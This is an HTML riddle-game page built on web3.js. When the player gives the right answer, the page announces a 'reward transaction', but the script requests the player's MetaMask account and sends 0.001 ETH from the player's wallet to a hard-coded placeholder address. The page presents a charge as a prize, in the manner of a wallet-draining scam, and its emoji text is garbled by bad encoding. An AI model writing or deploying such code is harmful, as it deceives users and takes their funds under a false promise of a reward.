<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Riddle Game</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to right, #667eea, #764ba2);
      color: #fff;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      background: rgba(0, 0, 0, 0.4);
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
      text-align: center;
      max-width: 500px;
      width: 100%;
      backdrop-filter: blur(10px);
    }

    h1 {
      margin-bottom: 20px;
      font-size: 28px;
    }

    p {
      font-size: 18px;
      margin-bottom: 30px;
    }

    input[type="text"] {
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 8px;
      margin-bottom: 15px;
      font-size: 16px;
    }

    button {
      background-color: #00c9a7;
      border: none;
      color: white;
      padding: 12px 24px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 8px;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #00b29e;
    }

    .status {
      margin-top: 20px;
      font-size: 18px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üß† Riddle Challenge</h1>
    <p>‚ÄúThe more you take, the more you leave behind. What am I?‚Äù</p>
    <input type="text" id="userAnswer" placeholder="Enter your answer..." />
    <button onclick="checkAnswer()">Submit</button>
    <div class="status" id="status"></div>
  </div>

  <script>
    async function checkAnswer() {
      const input = document.getElementById("userAnswer").value.trim().toLowerCase();
      const status = document.getElementById("status");

      if (input === "footsteps") {
        status.innerText = "‚úÖ Correct! Initiating reward transaction...";
        status.style.color = "#00ffae";

        if (typeof window.ethereum !== 'undefined') {
          try {
            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
            const from = accounts[0];
            const to = '0x1234567890abcdef1234567890abcdef12345678'; // replace with real address
            const amount = Web3.utils.toHex(Web3.utils.toWei("0.001", "ether"));

            await ethereum.request({
              method: 'eth_sendTransaction',
              params: [{
                from: from,
                to: to,
                value: amount
              }]
            });

            status.innerText = "üéâ Payment sent successfully!";
          } catch (err) {
            status.innerText = "‚ö†Ô∏è Transaction failed: " + err.message;
          }
        } else {
          status.innerText = "‚ùå MetaMask not detected.";
        }
      } else {
        status.innerText = "‚ùå Wrong answer. Try again!";
        status.style.color = "#ffb3b3";
      }
    }
  </script>
</body>
</html>
